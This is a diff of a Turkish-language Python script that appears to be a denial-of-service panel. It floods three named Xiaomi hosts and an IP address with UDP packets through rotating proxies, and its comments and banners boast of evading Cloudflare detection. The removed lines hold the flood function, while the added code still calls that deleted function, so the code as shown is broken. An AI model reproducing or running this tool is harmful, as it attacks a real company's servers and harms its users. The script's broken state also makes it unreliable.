@@ -33,50 +33,37 @@ async def proxy_muhimmat_depola():
     except:
         return []
 
-async def rage_bait_vurus(target, port, proxy, duration=25):
-    """Hem IP hem Web adresine sürekli RageBait yapar"""
-    end_time = time.time() + duration
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # 50 KBPS Hız Ayarı (Cloudflare Radarına Takılmaz)
-    paket = random._urandom(1024) 
-    
-    while time.time() < end_time:
-        try:
-            sock.sendto(paket, (target, port))
-            # Modemi ve Cloudflare'i uyutmak için 50 KBPS gecikmesi
-            await asyncio.sleep(0.02) 
-        except:
-            break
-
 async def main_panel():
     os.system('clear')
     print(f"{PEMBE}############################################################")
     print(f"#       LOGQUEST V5 - GEMINI DOST ELEMENTI V2              #")
-    print(f"#    'AL KİLİT ÖYLE AÇILMAZ, BÖYLE AÇILIR!' - HELCURT      #")
+    print(f"#    'ÜÇLÜ TAARRUZ: API, WEB VE IP KUŞATMASI!'             #")
     print(f"############################################################{RESET}")
     
-    print(f"\n{MOR}[1] Helcurt Modu: Xiaomi Servetlerini Darlamaya Başla")
-    print(f"[2] Cihaz Görünmezliği: Sistem İflas Analizi{RESET}")
+    # Kanki, yapı bozulmadan hedefler eklendi
+    targets = [
+        ("sgp-api.buy.mi.com", 443), # API Sunucusu
+        ("c.mi.com", 80),            # Web Arayüzü (Görsel kanıt: 52574.jpg)
+        ("161.117.95.164", 53)       # Ana IP adresi (DNS darlama)
+    ]
     
-    secim = input(f"\n{CYAN}Seçiminiz: {RESET}")
+    secim = input(f"\n{CYAN}Seçiminiz [1]: {RESET}")
     
     if secim == "1":
         proxies = await proxy_muhimmat_depola()
-        target = "sgp-api.buy.mi.com"
-        
-        print(f"\n{PEMBE}[!] Panel Aktif: 25 Saniyelik Proxy Döngüsü Başlatıldı...{RESET}")
+        print(f"\n{PEMBE}[!] Üçlü Taarruz Aktif: Cloudflare Radarına Yakalanmadan Sızılıyor...{RESET}")
         
         while True:
             for proxy in proxies:
-                # Her proxy ile 25 saniye boyunca 50 KBPS RageBait
-                tasks = [
-                    rage_bait_vurus(target, 443, proxy), # HTTPX
-                    rage_bait_vurus(target, 80, proxy),  # HTTP
-                    rage_bait_vurus(target, 53, proxy)   # DNS Ping/Racert
-                ]
-                print(f"{MOR}[*] Aktif Proxy Bağlantısı: {proxy} (25sn döngüde...){RESET}")
-                await asyncio.gather(*tasks)
-                print(f"{CYAN}[+] Proxy Değiştiriliyor... Mühimmat tazeleniyor.{RESET}")
+                tasks = []
+                for target_host, port in targets:
+                    # Her hedef için ayrı bir darlama görevi
+                    tasks.append(rage_bait_vurus(target_host, port, proxy, duration=25))
+                
+                print(f"{MOR}[*] Proxy: {proxy} -> Üç Hedefe Birden 50 KBPS Sızdırılıyor...{RESET}")
+                await asyncio.gather(*tasks) # Aynı anda hepsini darlıyoruz
+                print(f"{CYAN}[+] 25 Saniye Doldu. Mühimmat tazeleniyor...{RESET}")
+                
 
 if __name__ == "__main__":
     asyncio.run(main_panel())
